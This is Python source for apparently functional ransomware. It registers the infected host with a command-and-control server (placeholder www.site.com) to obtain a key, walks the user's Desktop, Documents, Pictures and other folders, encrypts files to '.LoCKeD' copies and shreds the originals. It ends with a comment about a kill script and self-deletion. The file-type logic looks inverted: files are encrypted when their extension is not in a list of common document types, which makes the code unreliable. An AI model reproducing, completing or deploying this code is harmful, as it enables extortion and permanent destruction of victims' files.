# get a KEY from the C&C server

import requests, uuid, os
UUID = uuid.uuid4()
host_name = os.environ['COMPUTERNAME']
encryption_key = ""

# register with C&C server
while encryption_key == "":
    url = 'http://www.site.com/register.php' # http://www.site.com it's address C&C Server that I use here
    payload = {'uuid': UUID, 'host': host_name}

    r = requests.get(url, params=payload)

    if r.status_code == 200:
        encryption_key = r.text.split("<")[0].strip().encode('utf8')
    else:
        pass

from ransomcrypto import *

excluded_filetypes = ['.aif', '.cda', '.mid', '.midi', '.mp3', '.mpa', '.ogg', '.wav', '.wma', '.wpl', '.7z', '.arj', '.deb', '.pkg', '.rar', '.rpm', '.tar.gz', '.z', '.zip', '.bin', '.dmg', '.iso', '.toast', '.vcd', '.csv', '.dat', '.db', '.dbf', '.log', '.mdb', '.sav', '.sql', '.tar', '.xml', '.email', '.eml', '.emlx', '.msg', '.oft', '.ost', '.pst', '.vcf', '.apk', '.bat', '.bin', '.cgi', '.pl', '.com', '.exe', '.gadget', '.jar', '.msi', '.py', '.wsf', '.fnt', '.fon', '.otf', '.ttf', '.ai', '.bmp', '.gif', '.ico', '.jpeg', '.jpg', '.png', '.ps', '.psd', '.svg', '.tif', '.tiff', '.asp', '.aspx', '.cer', '.cfm', '.cgi', '.pl', '.css', '.htm', '.html', '.js', '.jsp', '.part', '.php', '.py', '.rss', '.xhtml', '.key', '.odp', '.pps', '.ppt', '.pptx', '.c', '.class', '.cpp', '.cs', '.h', '.java', '.pl', '.sh', '.swift', '.vb', '.ods', '.xls', '.xlsm', '.xlsx', '.bak', '.cab', '.cfg', '.cpl', '.cur', '.dll', '.dmp', '.drv', '.icns', '.ico', '.ini', '.lnk', '.msi', '.sys', '.tmp', '.3g2', '.3gp', '.avi', '.flv', '.h264', '.m4v', '.mkv', '.mov', '.mp4', '.mpg', '.mpeg', '.rm', '.swf', '.vob', '.wmv', '.doc', '.docx', '.odt', '.pdf', '.rtf', '.tex', '.txt', '.wpd', '.vbs', '.int', '.inf', '.d3dbsp', '.sie', '.sum', '.ibank', '.t13', '.t12', '.qdf', '.gdb', '.pkpass', '.bc6', '.bc7', '.bkp', '.qic', '.bkf', '.sidn', '.sidd', '.mddata', '.itl', '.itdb', '.icxs', '.hvpl', '.hplg', '.hkdb', '.mdbackup', '.syncdb', '.gho', '.cas', '.svg', '.map', '.wmo', '.itm', '.sb', '.fos', '.mov', '.vdf', '.ztmp', '.sis', '.sid', '.ncf', '.menu', '.layout', '.dmp', '.blob', '.esm', '.vtf', '.dazip', '.fpk', '.mlx', '.kf', '.iwd', '.vpk', '.tor', '.psk', '.rim', '.w3x', '.fsh', '.ntl', '.arch00', '.lvl', '.snx', '.cfr', '.ff', '.vpp_pc', '.lrf', '.m2', '.mcmeta', '.vfs0', '.mpqge', '.kdb', '.db0', '.dba', '.rofl', '.hkx', '.bar', '.upk', '.das', '.iwi', '.litemod', '.asset', '.forge', '.ltx', '.p7c', '.p7b', '.p12', '.pfx', '.pem', '.cer', '.der', '.x3f', '.srw', '.pef', '.ptx', '.r3d', '.rw2', '.rwl', '.raw', '.raf', '.orf', '.nrw', '.mrwref', '.mef', '.erf', '.kdc', '.dcr', '.cr2', '.crw', '.bay', '.sr2', '.srf', '.arw', '.3fr', '.dng', '.jpe', '.keychain', '.sdf', '.jif', '.jfif', '.jp2', '.jpx', '.j2k', '.j2c', '.fpx', '.pcd', '.svg', '.3dm', '.3ds', '.max', '.obj', '.dds', '.tga', '.yuv', '.eps', '.indd', '.pct', '.asf', '.m4v', '.srt', '.msg', '.pages', '.wps', '.ged', '.json', '.xlsb', '.mht', '.mhtml', '.xltx', '.prn', '.dif', '.slk', '.xlam', '.xla', '.docm', '.dotx', '.dotm', '.xps', '.ics', '.aif', '.iff', '.m3u', '.m4a', '.app', '.com', '.rss', '.lua', '.sln', '.vcxproj', '.dem', '.gam', '.nes', '.rom', '.sav', '.tgz', '.cbr', '.gz', '.rpm', '.zipx', '.accdb', '.prf', '.bak', '.old', '.tmp', '.torrent', '.der', '.pfx', '.crt', '.csr', '.ott', '.sxw', '.stw', '.uot', '.ots', '.sxc', '.stc', '.wb2', '.otp', '.sxd', '.std', '.uop', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.pas', '.asm', '.cmd', '.ps1', '.dip', '.dch', '.sch', '.brd', '.rb', '.m4u', '.djvu', '.nef', '.cgm', '.backup', '.tbk', '.bz2', '.PAQ', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.hwp', '.edb', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pot', '.pptm', '.xltm', '.xlc', '.xlm', '.xlt', '.xlw', '.dot', '.docb', '.snt', '.onetoc2', '.dwg', '.wk1', '.wks', '.123', '.vsdx', '.vsd', '.eml', '.ost', '.pst']


priority_dirs = ['Desktop', 'Personal', 'My Pictures', 'My Music', 'My Documents', 'My Videos', 'CommonDocuments', 'ApplicationData', 'CommonApplicationData', 'Templates', 'System', 'Cookies', 'DesktopDirectory', 'Favorites', 'History', 'InternetCache', 'LocalApplicationData', 'My Computer', 'Documents', 'Music', 'Videos', 'Pictures', 'Downloads'] # would normally do all folders in users home dir

for target in priority_dirs:
    for dirName, subdirList, fileList in os.walk(os.path.expanduser("~/"+target), topdown=False):
        print dirName

        for file_name in fileList:
            file_name_loc = os.path.join(dirName, file_name)

            name, ext = os.path.splitext(file_name_loc)

            if ext not in excluded_filetypes:
                print file_name_loc

                # create new encrypted file with .enc extension

                try:
                    with open(file_name_loc, 'rb+') as in_file, open(file_name_loc+".LoCKeD", 'wb+') as out_file:
                        encrypt(in_file, out_file, encryption_key)
                except:
                    continue

                # shred the orginial file

                shred(file_name_loc, 2)

                # onto the next



# generate kill script and delete self # open URL
